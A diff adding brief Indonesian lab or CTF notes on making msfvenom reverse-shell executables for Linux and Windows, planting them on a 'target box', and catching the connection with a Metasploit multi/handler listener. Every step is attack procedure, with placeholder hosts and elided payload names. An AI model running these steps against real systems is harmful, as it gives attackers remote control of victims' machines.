@@ -1,0 +1,13 @@
+gunakan msfvenom untuk generate file "speaker" dengan
+-> msfvenom -p linux/.../... lhost=LOCAL-IP lport=LOCAL-PORT -f elf > file.elf
+-> msfvenom -p windows/.../... lhost=LOCAL-IP lport=LOCAL-PORT -f exe > file.exe
+kirim generated file ke target box
+
+lalu ke msfconsole
+-> use exploit/multi/handler
+-> set payload [linux/...][windows/...]
+-> set lhost LOCAL-IP
+-> set lport LOCAL-PORT
+-> run
+
+lalu run generated file di target box
